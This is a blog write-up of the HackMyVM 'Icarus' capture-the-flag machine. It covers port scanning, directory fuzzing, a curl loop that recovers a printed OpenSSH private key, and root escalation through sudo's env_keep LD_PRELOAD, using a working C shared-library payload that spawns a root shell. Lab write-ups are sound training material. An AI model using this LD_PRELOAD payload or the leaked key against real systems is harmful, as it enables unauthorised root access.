---
layout: post
author: maxin
title:  "Icarus"
date:   2021-12-31 12:53:19 AM -03
category: HackMyVM
tags: Writeup
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Icarus)

# Enumeration

{% highlight bash %}
# Nmap 7.92 scan initiated Wed Dec 29 19:10:34 2021 as: nmap -sC -sV -v -oN nmap 192.168.0.23
Nmap scan report for 192.168.0.23
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b6:65:56:40:8d:a8:57:b9:15:1e:0e:1f:a5:d0:52:3a (RSA)
|   256 79:65:cb:2a:06:82:13:d3:76:6b:1c:55:cd:8f:07:b7 (ECDSA)
|_  256 b1:34:e5:21:a0:28:30:c0:6c:01:0e:b0:7b:8f:b8:c6 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: LOGIN
|_http-server-header: nginx/1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 29 19:10:41 2021 -- 1 IP address (1 host up) scanned in 7.62 seconds
{% endhighlight %}

# Port 80

We have a login page. Tried admin/admin and sqlmap, but found nothing 

## Fuzzing

{% highlight bash %}
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x php,html,txt
{% endhighlight %}

{% highlight bash %}
/login.php            (Status: 302) [Size: 0] [--> index.php]
/xml                  (Status: 200) [Size: 1]
/a                    (Status: 200) [Size: 9641]
/index.php            (Status: 200) [Size: 407]
/xxx                  (Status: 200) [Size: 1]
/check.php            (Status: 200) [Size: 21]
------ SNIP ------
/xch                  (Status: 200) [Size: 1]
/xfm                  (Status: 200) [Size: 1]
{% endhighlight %}

Use curl to make a request to `/a` returns a lot of letters. We can use this to fuzzing 

{% highlight bash %}
curl "http://%IP/a" > url
{% endhighlight %}

{% highlight bash %}
for i in $(cat url); do curl "http://%IP/$i" >> curl.output; done
{% endhighlight %}

This for will loop every word and make a request, sending the output to a file

{% highlight bash %}
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA5xagxLiN5ObhPjNcs2I2ckcYrErKaunOwm40kTBnJ6vrbdRYHteS
afNWC6xFFzwO77+Kze229eK4ddZcwmU0IdN02Y8nYrxhl8lOc+e5T0Ajz+tRmLGoxJVPsS
TzKBERlWpKuJoGO/CEFLOv6PP6s79YYzZFpdUjaczY96jgICftzNZS+VkBXuLjKr79h4Tw
z7BK4V6FEQY0hwT8NFfNrF3x3VPe0UstdiUJFl4QV/qAPlHVhPd0YUEPr/95mryjuGi1xw
P7xVFrYyjLfPepqYHiS5LZxFewLWhhSjBOI0dzf/TwiNRnVGTZhB3GemgEIQRAam26jkZZ
3BxkrUVckQAAA8jfk7Jp35OyaQAAAAdzc2gtcnNhAAABAQDnFqDEuI3k5uE+M1yzYjZyRx
isSspq6c7CbjSRMGcnq+tt1Fge15Jp81YLrEUXPA7vv4rN7bb14rh11lzCZTQh03TZjydi
vGGXyU5z57lPQCPP61GYsajElU+xJPMoERGVakq4mgY78IQUs6/o8/qzv1hjNkWl1SNpzN
j3qOAgJ+3M1lL5WQFe4uMqvv2HhPDPsErhXoURBjSHBPw0V82sXfHdU97RSy12JQkWXhBX
+oA+UdWE93RhQQ+v/3mavKO4aLXHA/vFUWtjKMt896mpgeJLktnEV7AtaGFKME4jR3N/9P
CI1GdUZNmEHcZ6aAQhBEBqbbqORlncHGStRVyRAAAAAwEAAQAAAQEAvdjwMU1xfTlUmPY3
VUP9ePsBwSIck6ML8t35H8KFLKln3C4USxpNNe/so+BeTo1PtBVHYpDFu9IMOvrl7+qW3q
dLGyUpdUtQXhPK+RvJONt30GwB+BEUlpQYCW9SuHr1WCwfwPMA5iNdT2ijvx0ZvKwZYECJ
DYlB87yQDz7VCnRTiQGP2Mqiiwb7vPd/t386Y+cAz1cVl7BnHzWWJTUTkKCwijnvjYrD0o
tTQX4sGd6CrI44g+L8hnYuCZz+a0j6IyUfXJqj6l+/Z2Af7pJjbJD3P28xX7eY0h1Cec2l
/sb7qg2wy0qJNywJ35l8bZzZKjkXztPLOqMFQ6Fh0BqSdQAAAIEAlaH0ZEzJsZoR3QqcKl
xRKjVcuQCwcrKlNbJu2qRuUG812CLb9jJxJxacJPBV0NS832c+hZ3BiLtA5FwCiGlGq5m5
HS3odf3lLXDfIK+pur4OWKBNLDxKbqi4s4M05vR4gHkmotiH9eWlCNuqL46Ip5H1vFXeJM
pLRLN0gqOGuQQAAACBAPfffuhidAgUZH/yTvATKC5lcGrE7bkpOq+6XMMgxEQl0Hzry76i
rGXkhTY4QUtthYo4+g7jiDzKlbeaS7aN8RYq38GzQnZZQcSdvL1yB/N554gQvzJLvmKQbm
gLhMRcdDmifUelJYXib2Mjg/BLaRXaEzOomUKR2nyJH7VgU+xzAAAAgQDuqkBp44indqhx
wrzbfeLnzQqpZ/rMZXGcvJUttECRbLRfohUftFE5J0PKuT8w0dpacNCVgkT9A0Tc3xRfky
ECBQjeKLvdhcufJhQl0pdXDt1cpebE50LE4yHc8vR6FEjhR4P2AbGICJyRS7AX7UnrOWdU
IE3FeNP0r5UiSDq16wAAAA1pY2FydXNAaWNhcnVzAQIDBA==
-----END OPENSSH PRIVATE KEY-----
{% endhighlight %}

The output is a private key

# User

We can get the user of the private key using `ssh-keygen` 

{% highlight bash %}
ssh-keygen -y -f id_rsa

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnFqDEuI3k5uE+M1yzYjZyRxisSspq6c7CbjSRMGcnq+tt1Fge15Jp81YLrEUXPA7vv4rN7bb14rh11lzCZTQh03TZjydivGGXyU5z57lPQCPP61GYsajElU+xJPMoERGVakq4mgY78IQUs6/o8/qzv1hjNkWl1SNpzNj3qOAgJ+3M1lL5WQFe4uMqvv2HhPDPsErhXoURBjSHBPw0V82sXfHdU97RSy12JQkWXhBX+oA+UdWE93RhQQ+v/3mavKO4aLXHA/vFUWtjKMt896mpgeJLktnEV7AtaGFKME4jR3N/9PCI1GdUZNmEHcZ6aAQhBEBqbbqORlncHGStRVyR icarus@icarus
{% endhighlight %}

The user is icarus 

# Root

{% highlight bash %}
sudo -l

Matching Defaults entries for icarus on icarus:
    env_reset, mail_badpass, env_keep+=LD_PRELOAD, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User icarus may run the following commands on icarus:
    (ALL : ALL) NOPASSWD: /usr/bin/id
{% endhighlight %}

The real trick here it’s the `env_keep+=LD_PRELOAD`

[Linux Privilege Escalation using LD_Preload](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

Follow this guide we can create a C script and make this script a shared library

Change to /tmp directory and create a C script

{% highlight bash %}
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
{% endhighlight %}

And run the following commands

{% highlight bash %}
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so id
{% endhighlight %}